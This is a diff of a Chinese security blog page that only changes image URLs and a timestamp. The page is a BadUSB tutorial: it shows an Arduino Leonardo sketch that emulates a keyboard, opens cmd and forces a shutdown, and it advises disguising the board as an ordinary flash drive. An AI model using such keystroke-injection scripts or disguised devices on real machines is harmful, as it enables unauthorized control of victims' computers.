@@ -95,16 +95,16 @@
 <meta property="og:site_name" content="Leticia&#39;s Blog">
 <meta property="og:description" content="0x00 什么是BadUSBBadUSB主要依靠USB拇指驱动器的构建方式，USB通常有一个大的可重写的内存芯片用于实际的数据存储，以及一个独立的控制器芯片。类似于笔记本电脑的硬盘驱动器包含一个隐藏的主引导记录(Master Boot Record)，内存芯片中内存单元的第一段包含让USB记录的编程，也就是说他不是利用普通u盘的autorun.inf，不会被检测到，这样攻击者植入恶意软件就不会被发">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:image" content="http://oo3iot5oz.bkt.clouddn.com/badusb/1.jpg">
-<meta property="og:image" content="http://oo3iot5oz.bkt.clouddn.com/badusb/2.png">
-<meta property="og:image" content="http://oo3iot5oz.bkt.clouddn.com/badusb/3.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/echohun/blog_image/master/backup/badusb/1.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/echohun/blog_image/master/backup/badusb/2.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/echohun/blog_image/master/backup/badusb/3.png">
 <meta property="og:image" content="http://oo3iot5oz.bkt.clouddn.com/badusb/4.png">
 <meta property="og:image" content="http://oo3iot5oz.bkt.clouddn.com/badusb/5.png">
-<meta property="og:updated_time" content="2017-10-15T03:35:48.667Z">
+<meta property="og:updated_time" content="2018-10-26T03:45:58.073Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="模拟键盘攻击——BadUSB制作">
 <meta name="twitter:description" content="0x00 什么是BadUSBBadUSB主要依靠USB拇指驱动器的构建方式，USB通常有一个大的可重写的内存芯片用于实际的数据存储，以及一个独立的控制器芯片。类似于笔记本电脑的硬盘驱动器包含一个隐藏的主引导记录(Master Boot Record)，内存芯片中内存单元的第一段包含让USB记录的编程，也就是说他不是利用普通u盘的autorun.inf，不会被检测到，这样攻击者植入恶意软件就不会被发">
-<meta name="twitter:image" content="http://oo3iot5oz.bkt.clouddn.com/badusb/1.jpg">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/echohun/blog_image/master/backup/badusb/1.jpg">
 
 
 
@@ -393,9 +393,9 @@
         <h2 id="0x00-什么是BadUSB"><a href="#0x00-什么是BadUSB" class="headerlink" title="0x00 什么是BadUSB"></a>0x00 什么是BadUSB</h2><p>BadUSB主要依靠USB拇指驱动器的构建方式，USB通常有一个大的可重写的内存芯片用于实际的数据存储，以及一个独立的控制器芯片。类似于笔记本电脑的硬盘驱动器包含一个隐藏的主引导记录(Master Boot Record)，内存芯片中内存单元的第一段包含让USB记录的编程，也就是说他不是利用普通u盘的autorun.inf，不会被检测到，这样攻击者植入恶意软件就不会被发现。  </p>
 <h2 id="0x01-USB协议漏洞"><a href="#0x01-USB协议漏洞" class="headerlink" title="0x01 USB协议漏洞"></a>0x01 USB协议漏洞</h2><p>现在的USB设备很多，比如音视频设备、摄像头等，因此要求系统提供最大的兼容性，甚至免驱；所以在设计USB标准的时候没有要求每个USB设备像网络设备那样占有一个唯一可识别的MAC地址让系统进行验证，而是允许一个USB设备具有多个输入输出设备的特征。这样就可以通过重写U盘固件，伪装成一个USB键盘，并通过虚拟键盘输入集成到U盘固件中的指令和代码而进行攻击。  </p>
 <h2 id="0x02-需要的工具"><a href="#0x02-需要的工具" class="headerlink" title="0x02 需要的工具"></a>0x02 需要的工具</h2><ul>
-<li>一块Arduino leonardo开发板，选择他是因为板子体积小容易包装成一个普通的u盘，并且代码非常好书写。<br><img src="http://oo3iot5oz.bkt.clouddn.com/badusb/1.jpg" alt=""></li>
-<li>Arduino ide，我们需要用它写代码并且烧录到badusb里面。<br><img src="http://oo3iot5oz.bkt.clouddn.com/badusb/2.png" alt=""></li>
-<li>外壳，将它包装的像一个普通u盘，不然这么块板子谁电脑会让你随便插，当然你也可以直接去淘宝购买已经包装好的badusb。<br><img src="http://oo3iot5oz.bkt.clouddn.com/badusb/3.png" alt=""></li>
+<li>一块Arduino leonardo开发板，选择他是因为板子体积小容易包装成一个普通的u盘，并且代码非常好书写。<br><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/badusb/1.jpg" alt=""></li>
+<li>Arduino ide，我们需要用它写代码并且烧录到badusb里面。<br><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/badusb/2.png" alt=""></li>
+<li>外壳，将它包装的像一个普通u盘，不然这么块板子谁电脑会让你随便插，当然你也可以直接去淘宝购买已经包装好的badusb。<br><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/badusb/3.png" alt=""></li>
 </ul>
 <h2 id="0x03-写入代码"><a href="#0x03-写入代码" class="headerlink" title="0x03 写入代码"></a>0x03 写入代码</h2><p>我们通过keyboard.h库里面提供的方法模拟键盘输入。如果进攻对象是windows的话，首先win+r然后输入cmd，进入命令行，这个时候几乎可以做到所有事情。如果进攻对象是linux，一般是ctrl+alt+t的组合开启terminal然后再输入命令。无论是进入哪种，只要你预先写好代码，对目标计算机上的文件下载，上传，删除，运行······怎么做都可以。<br>这里我们给出一个windows下的无害代码，使得我们u盘插入后目标计算机十秒关机。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;Keyboard.h&gt;</span><br><span class="line">void setup() &#123;</span><br><span class="line">  // put your setup code here, to run once:</span><br><span class="line">Keyboard.begin();//开始键盘通讯</span><br><span class="line">delay(3000);//延时</span><br><span class="line">Keyboard.press(KEY_LEFT_GUI);//win键</span><br><span class="line">delay(50);</span><br><span class="line">Keyboard.press(&apos;r&apos;);//r键</span><br><span class="line">delay(50);</span><br><span class="line">Keyboard.release(KEY_LEFT_GUI);//这里松开按键</span><br><span class="line">Keyboard.release(&apos;r&apos;);</span><br><span class="line">delay(1000);</span><br><span class="line">Keyboard.println(&quot;cmd \n&quot;); //注意这里命令多了一个空格 如果目标终端的输入法是中文的话这个空格非常关键</span><br><span class="line">delay(500);</span><br><span class="line">Keyboard.println(&quot;shutdown -s -t 10 \n&quot;); ; //注意有一个空格</span><br><span class="line">delay(1000);//延时</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">void loop() &#123;</span><br><span class="line">  // put your main code here, to run repeatedly:</span><br><span class="line"> </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
 <p>然后我们接入开发板，选择好串口和板子型号，按ctrl+u烧录，之后就可以用它来测试了。<br><img src="http://oo3iot5oz.bkt.clouddn.com/badusb/4.png" alt="选择端口"><br><img src="http://oo3iot5oz.bkt.clouddn.com/badusb/5.png" alt="选择型号">  </p>
